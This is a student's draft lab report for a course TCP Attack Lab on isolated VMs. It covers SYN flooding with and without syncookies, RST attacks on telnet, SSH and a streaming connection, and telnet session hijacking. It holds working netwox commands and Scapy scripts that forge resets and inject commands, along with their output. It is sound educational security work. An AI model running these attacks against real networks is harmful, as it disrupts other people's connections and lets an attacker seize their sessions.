# COSC434/534 Lab 3 Report (Live Working Draft)

Name: judah 
Date: 3/21/2026
Course: COSC434/534
Lab: TCP Attack Lab

## 1. Environment Setup and Verification

### 1.1 VM Identity Table

| VM Role | Hostname | Interface | IP Address | Notes |
|---|---|---|---|---|
| Attacker | attacker | enp0s3 | 10.0.2.9 | netwox/scapy installed |
| Server | server | enp0s3 | 10.0.2.8 | ssh and telnet listening (via xinetd) |
| Client | client | enp0s3 | 10.0.2.10 | ready for connection testing |

### 1.2 Commands Used for VM Checks

Run on EACH VM:

```bash
hostname
ip -br a
ip route
```

Ping matrix checks:

```bash
ping -c 2 <target-ip>
```

### 1.3 Tool and Service Checks

Attacker tool checks:

```bash
which netwox
python3 -c "from scapy.all import IP, TCP; print('scapy ok')"
```

Server service checks:

```bash
sudo systemctl status ssh --no-pager
sudo systemctl status openbsd-inetd --no-pager
sudo ss -ltnp | egrep ':22|:23'
```

Observations:

- [ ] All 3 VMs can ping each other
- [x] netwox available on attacker
- [ ] scapy imports on attacker
- [x] SSH listening on server port 22
- [x] Telnet listening on server port 23

Current blocker notes:

- Previous issue (resolved): all VMs initially had same NAT IP; now each VM has a unique IP.
- Previous issue (resolved): telnet on server port 23 is now listening via inetd.
- Previous issue (resolved): telnet daemon path mismatch under xinetd fixed; telnet login works.

## 2. Task 1: SYN Flooding Attack

### 2.1 Baseline (Before Attack)

On server:

```bash
sudo sysctl -q net.ipv4.tcp_max_syn_backlog
netstat -na | grep SYN_RECV
```

Baseline output notes:

- tcp_max_syn_backlog: 512
- SYN_RECV count observed during validation: 4097

Server listening evidence (current):

- Port 22 (ssh): LISTEN on 0.0.0.0 and [::]
- Port 23 (telnet): LISTEN on 0.0.0.0 and [::] via inetd

### 2.2 Attack Command (Netwox 76)

On attacker:

```bash
sudo netwox 76 -i <server-ip> -p <target-port>
```

If needed:

```bash
sudo netwox 76 -i <server-ip> -p <target-port> -s raw
```

### 2.3 During Attack Validation

On server (while attack runs):

```bash
netstat -na | grep SYN_RECV
```

Observation notes:

- SYN_RECV behavior: high SYN_RECV buildup observed (example count: 4097; sample entries on 10.0.2.15:22 from many spoofed source IPs/ports).
- Did legitimate connection degrade/fail? yes; new ssh/telnet connection attempts became unstable or were reset during active flooding.

### 2.4 SYN Cookies OFF vs ON (Required)

On server:

```bash
sudo sysctl -a | grep syncookies
sudo sysctl -w net.ipv4.tcp_syncookies=0
# run attack and record
sudo sysctl -w net.ipv4.tcp_syncookies=1
# run attack and record
```

Comparison summary:

- With syncookies OFF: SYN_RECV count remained very high (observed 4023).
- With syncookies ON: SYN_RECV count dropped significantly compared to OFF (observed 430).

Screenshots/log evidence filenames:

- pending user-provided filenames

## 3. Task 2: TCP RST Attack on Telnet and SSH

### 3.1 Session Setup

From client:

```bash
telnet <server-ip>
ssh <server-user>@<server-ip>
```

Observed results:

- Initial: `telnet 10.0.2.15` was `Connection refused` before telnet listener fix.
- After fix: telnet connected, then `Connection closed by foreign host`.
- `ssh jb@10.0.2.15`: successful login.
- Final baseline: telnet connection reaches login prompt and accepts user login successfully.

### 3.2 Netwox 78 Attempt

On attacker:

```bash
sudo netwox 78 -d <iface> -f "tcp and src host <client-ip> and dst host <server-ip> and dst port 23"
sudo netwox 78 -d <iface> -f "tcp and src host <client-ip> and dst host <server-ip> and dst port 22"
```

### 3.3 Scapy RST Attempt

```python
from scapy.all import IP, TCP, send
ip = IP(src="<client-ip>", dst="<server-ip>")
tcp = TCP(sport=<client-src-port>, dport=<server-port>, flags="R", seq=<seq>, ack=<ack>)
send(ip/tcp, verbose=0)
```

Scapy telnet RST script used:

```python
from scapy.all import sniff, IP, TCP, send

CLIENT="10.0.2.7"
SERVER="10.0.2.15"

def hit(pkt):
  if IP not in pkt or TCP not in pkt:
    return
  ip, tcp = pkt[IP], pkt[TCP]
  if ip.src != CLIENT or ip.dst != SERVER or tcp.dport != 23:
    return
  payload_len = len(bytes(tcp.payload))
  base = tcp.seq + payload_len
  for off in [0, 1, 8, 16, 32, 64]:
    rst = IP(src=CLIENT, dst=SERVER)/TCP(sport=tcp.sport, dport=23, flags="R", seq=base+off)
    send(rst, verbose=0)
  print(f"RST burst sent: sport={tcp.sport}, seq_base={base}")

sniff(filter=f"tcp and src host {CLIENT} and dst host {SERVER} and dst port 23", prn=hit, count=1, store=0)
```

Observations:

- Telnet behavior: Netwox RST on port 23 caused immediate connection closures (`Connection closed by foreign host` observed on client).
- SSH behavior: Netwox RST on port 22 caused disconnect/reset (`client_loop: send disconnect: Broken pipe` and `Connection reset by 10.0.2.15 port 22`).

Netwox evidence snippets:

- Attacker command used for telnet: `sudo netwox 78 -d enp0s3 -f "tcp and src host 10.0.2.7 and dst host 10.0.2.15 and dst port 23"`
- Attacker command used for ssh: `sudo netwox 78 -d enp0s3 -f "tcp and src host 10.0.2.7 and dst host 10.0.2.15 and dst port 22"`

Scapy evidence snippets:

- Script output: `RST burst sent: sport=42518, seq_base=3039819255`
- Client result during telnet login: `Connection closed by foreign host` immediately after injection.

Task 2 status:

- Netwox RST attack validated for both telnet and ssh.
- Scapy RST attack validated on telnet session.

## 4. Task 3: TCP RST Attack on Video Streaming (TCP)

### 4.1 Video Session Setup

Victim opens TCP-based video source (not QUIC/YouTube).

### 4.2 RST Command

On attacker:

```bash
sudo netwox 78 -d <iface> -f "tcp and dst host <victim-ip>"
```

Observations:

- Streaming impact: Successful disruption. Client `wget` repeatedly failed during transfer with `Read error ... (Connection reset by peer). Retrying.`
- Server-side impact: Python HTTP server logged repeated `ConnectionResetError: [Errno 104] Connection reset by peer` during active transfer.
- Attack commands used (attacker):
  - `sudo netwox 78 -d enp0s3 -f "tcp and src host 10.0.2.8 and src port 8000 and dst host 10.0.2.10"`
  - `sudo netwox 78 -d enp0s3 -f "tcp and src host 10.0.2.10 and dst host 10.0.2.8 and dst port 8000"`
- Client evidence snippet:
  - `Read error at byte 3455392/524288000 (Connection reset by peer). Retrying.`
- Evidence packet capture file: pending user screenshot filename / optional tcpdump capture

Task 3 status:

- Netwox RST attack on TCP file/video-style stream validated.

## 5. Task 4: TCP Session Hijacking (Telnet)

### 5.1 Netwox 40 Injection

Hex convert:

```bash
python3 - <<'PY'
cmd = "touch /tmp/tcp_hijack_success\n"
print(cmd.encode().hex())
PY
```

Inject:

```bash
sudo netwox 40 \
  -l <client-ip> \
  -m <server-ip> \
  -j <ttl> \
  -o <client-src-port> \
  -p 23 \
  -q <seq-num> \
  -E <window-size> \
  -r <ack-num> \
  -z \
  -H <hex-command-data>
```

### 5.2 Scapy Injection

```python
from scapy.all import IP, TCP, send
ip = IP(src="<client-ip>", dst="<server-ip>")
tcp = TCP(sport=<client-src-port>, dport=23, flags="A", seq=<seq>, ack=<ack>)
data = "touch /tmp/tcp_hijack_scapy\n"
send(ip/tcp/data, verbose=0)
```

Verification on server:

```bash
ls -l /tmp/tcp_hijack_success /tmp/tcp_hijack_scapy
```

Observations:

- Netwox injection result: Not used as primary proof in final run; Scapy method used for reliable injection timing.
- Scapy injection result: Successful. Attacker captured active telnet packet (`sport=55004 seq=3215123248 payload=1 ack=2476772353`) and sent forged `PA` packet burst containing `touch /tmp/tcp_hijack_scapy\n`.
- Server verification result: `ls -l /tmp/tcp_hijack_scapy` showed file created (`-rw-rw-r-- ... /tmp/tcp_hijack_scapy`).

Task 4 status:

- TCP session hijacking/injection validated via Scapy on active telnet session.

## 6. Final Analysis

- What worked best and why: Scapy-based targeted injection worked best for hijacking because it allowed direct control of `seq/ack` values from live captured traffic.
- Key differences between tools (netwox vs scapy): Netwox is fast for predefined attack patterns (SYN flood, RST disruption), while Scapy is better for custom packet crafting and precise session hijack logic.
- Security lessons learned: TCP sessions without cryptographic protection (e.g., telnet) are vulnerable to spoofing, reset, and injection. Defenses include encrypted protocols (SSH/TLS), anti-spoofing filters, IDS/IPS monitoring, and network segmentation.

## 4. Screenshot Index

-2. ____________________
-1. ____________________
0. ____________________
1. ____________________
2. ____________________
